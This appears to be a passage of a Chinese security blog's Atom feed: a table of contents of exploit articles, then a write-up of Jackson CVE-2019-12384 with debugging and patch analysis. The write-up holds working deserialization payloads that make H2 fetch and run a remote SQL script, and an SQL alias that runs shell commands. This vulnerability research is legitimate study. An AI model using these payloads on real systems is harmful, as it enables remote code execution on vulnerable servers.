href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li><li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li><li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li><li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li><li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li><li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li><li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li></ul></li><li>Struts2</li><li>Spring<ul><li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li><li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li><li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li><li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li><li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li><li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li><li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li><li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li><li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li><li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li><li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li><li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li><li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li></ul></li><li>SpringCloud</li></ul></li><li><strong>PHP</strong><ul><li>PHP安全<ul><li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li><li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li><li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li><li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li><li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li><li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li><li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li><li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li><li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li><li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li><li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li><li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li><li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li><li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li><li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li><li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li><li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li><li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li></ul></li><li>CMS<ul><li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li></ul></li></ul></li><li><strong>Python</strong><ul><li>Python安全<ul><li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li><li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li><li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li><li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li></ul></li><li>安全开发<ul><li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li><li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li></ul></li><li>爬虫</li><li>Django</li></ul></li><li><strong>JavaScript</strong><ul><li>JavaScript安全<ul><li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li></ul></li><li>NodeJS</li><li>AngularJS</li></ul></li><li><strong>GO</strong><ul><li>GO安全<ul><li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li></ul></li></ul></li><li><strong>二进制安全</strong><ul><li>二进制基础<ul><li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li><li><a href="/2019/04/27/堆基础/">堆基础</a></li><li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li><li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li><li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li><li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li><li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li></ul></li><li>C/C++<ul><li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li></ul></li><li>逆向工程</li><li>Fuzzing</li><li>Pwn<ul><li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li><li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li><li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li><li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li><li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li><li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li><li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li><li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li><li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li><li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li></ul></li><li>WriteUp Pwn<ul><li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li></ul></li><li>WriteUp Reverse<ul><li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li></ul></li></ul></li><li><strong>渗透测试</strong><ul><li>基础&amp;Tricks</li><li>Kali</li><li>Metasploit</li><li>内网渗透</li><li>提权<ul><li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li><li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li></ul></li><li>免杀</li><li>工具</li></ul></li><li><strong>OS</strong><ul><li>Windows<ul><li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li><li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li></ul></li><li>Linux</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Good Good Study&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;/archives&quot;&gt;归档&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Web安全&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;Web安全基础&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Jackson系列五——CVE-2019-12384（基于logback利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/22/Jackson%E7%B3%BB%E5%88%97%E4%BA%94%E2%80%94%E2%80%94CVE-2019-12384%EF%BC%88%E5%9F%BA%E4%BA%8Elogback%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/</id>
    <published>2019-11-22T12:52:46.000Z</published>
    <updated>2019-11-24T09:20:25.599Z</updated>
    
    <content type="html"><![CDATA[<p>本次CVE是基于logback的利用链的。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt;2.9.9.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>需要logback和H2数据库的依赖，但是用H2嵌入式数据库的场景很少见。</p><h2 id="0x03-H2特性——用户自定义函数"><a href="#0x03-H2特性——用户自定义函数" class="headerlink" title="0x03 H2特性——用户自定义函数"></a>0x03 H2特性——用户自定义函数</h2><p>H2数据库，是Java实现的内存数据库，可作为嵌入式内存数据库，提供用户自定义数据库函数以及在数据库中注册函数的功能。</p><p>下面看看用户如何来自定义H2数据库函数的。</p><p>现在假设我们需要在H2数据库中实现Oracle的”TO_DATE”函数，那么需要的过程是这样的：</p><ol><li>使用Java实现自定义函数的方法；</li><li>将Java的自定义函数注册到H2数据库中；</li></ol><p>首先我们自定义这个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.seraph.bi.suite.support.h2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> org.h2.tools.SimpleResultSet; </span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Function</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> java.sql.<span class="function">Date <span class="title">to_date</span><span class="params">(String source, String format)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 'YYYY-MM-DD' ? Oracle format?</span></span><br><span class="line">SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>);</span><br><span class="line">java.util.Date date = sdf.parse(source);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> java.sql.Date(date.getTime());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 以上代码段是TO_DATE的实现，但用户自定义的函数需注意的是：类和方法必须是公共（Public）的，且方法需为静态（static）的，如方法中使用了Connection对象需将其关闭。</p><p>第二步，我们将其注册到数据库中，执行<code>CREATE ALIAS</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] newFunctionAliasName [<span class="keyword">DETERMINISTIC</span>] <span class="keyword">FOR</span> classAndMethodName</span><br></pre></td></tr></table></figure><p>本例的语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> <span class="keyword">TO_DATE</span> <span class="keyword">FOR</span> <span class="string">"com.seraph.bi.suite.support.h2.Function.to_date"</span>;</span><br></pre></td></tr></table></figure><p>之后，再执行类似如下语句，函数TO_DATE即可被解析了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">to_date</span>(<span class="string">'2009-1-21'</span>,<span class="string">'YYYY-MM-DD'</span>) <span class="keyword">from</span> Your_Table;</span><br></pre></td></tr></table></figure><h2 id="0x04-复现利用"><a href="#0x04-复现利用" class="headerlink" title="0x04 复现利用"></a>0x04 复现利用</h2><p>需要的jar包如下：</p><ul><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-databind/2.9.8/jackson-databind-2.9.8.jar" target="_blank" rel="noopener">jackson-databind-2.9.8</a></li><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-annotations/2.9.8/jackson-annotations-2.9.8.jar" target="_blank" rel="noopener">jackson-annotations-2.9.8</a></li><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.9.8/jackson-core-2.9.8.jar" target="_blank" rel="noopener">jackson-core-2.9.8</a></li><li><a href="http://central.maven.org/maven2/ch/qos/logback/logback-core/1.3.0-alpha4/logback-core-1.3.0-alpha4.jar" target="_blank" rel="noopener">logback-core-1.3.0-alpha4</a></li><li><a href="http://central.maven.org/maven2/com/h2database/h2/1.4.199/h2-1.4.199.jar" target="_blank" rel="noopener">h2-1.4.199</a></li></ul><p>关键PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"</span>&#125;]</span><br></pre></td></tr></table></figure><p>以下Demo，先尝试向目标服务器发起请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"&#125;]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = mapper.readValue(payload, Object.class);</span><br><span class="line">            <span class="comment">// 反序列化之后还需要进行序列化操作才能触发！</span></span><br><span class="line">            String s = mapper.writeValueAsString(object);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，反序列化之后需要调用ObjectMapper.writeValueAsString()即进行序列化操作才能成功触发漏洞，这就是该CVE的鸡肋之处。</p><p>运行后，目标服务端接收到GET方式请求/inject.sql即成功：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/1.png" alt=""></p><p>PoC中的JSON实际上是在H2内存数据库初始化的时候执行RUNSCRIPT指令，从指定的URL中加载执行SQL脚本。而由于刚才的Demo中Web服务未放置该SQL脚本因为没有执行，下面来看看怎么实现漏洞利用。</p><p>在Web服务端编写inject.sql，根据H2的用户可自定义函数的功能来实现，第一部分是<code>CREATE ALIAS</code>命令用来自定义shellexec()函数的内容，第二部分是<code>call</code>SQL命令，用来调用前面自定义的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="built_in">void</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line"><span class="keyword">String</span>[] command = &#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">Runtime.getRuntime().exec(command);</span><br><span class="line">&#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>再次运行即可成功弹计算器：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/2.png" alt=""></p><p>我们可以再优化一下。我们看到payload中，url键对应的值其实就是一条SQL命令<code>jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;</code>，因此，我们可以直接将相应的URL部分替换为其他SQL命令，使用文件存储方式先定义一个命令执行的函数，注意代码中的分号需要用反斜杠转义一下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123; Runtime.getRuntime().exec(cmd)\\; &#125;$$;"</span>&#125;]</span><br></pre></td></tr></table></figure><p>这里jdbc:h2:file会在本地Users目录中生成指定的数据库文件即C:/Users/xx/.h2/mi1k7ea.mv.db，下次可以直接调用该文件进行操作。</p><p>接着同样使用文件存储模式，执行CALL命令调用刚刚自定义的函数即可时效内任意代码执行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');"</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/3.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><p>我们在ch.qos.logback.core.db.DriverManagerConnectionSource类上的所有getter方法和setter方法上打上断点，然后调试发现：</p><p>如果在Jackson反序列化之后不调用ObjectMapper.writeValueAsString()，则只会调用DriverManagerConnectionSource类的setUrl()函数；</p><p>如果在Jackson反序列化之后调用ObjectMapper.writeValueAsString()，则在调用DriverManagerConnectionSource类的setUrl()函数之后再调用getDriverClass()、getUrl()、getConnection()；</p><p>接着在<code>mapper.writeValueAsString(object);</code>处打上断点重新调试。</p><p>在Jackson序列化的过程中，会通过调用getter方法来获取对象的属性值，会循环调用BeanPropertyWriter.serializeAsField()函数，其中通过反射机制来调用要序列化的对象所属类的getter方法：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/4.png" alt=""></p><p>在循环调用 函数的时候，会先后调用getDriverClass()、getUrl()、getConnection()等类的getter方法。</p><p>在最后调用getConnection()函数中，调用了DriverManager.getConnection()函数来和H2数据库进行连接交互，并且由于url参数我们外部可控，因此就能利用H2用户可自定义函数的特性来实现RCE：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/5.png" alt=""></p><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>Jackson在2.9.9.1版本中添加了ch.qos.logback.core.db.DriverManagerConnectionSource类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [databind#2334]: logback-core (2.9.9.1)</span></span><br><span class="line">s.add(<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank" rel="noopener">Jackson gadgets - Anatomy of a vulnerability</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
</feed>
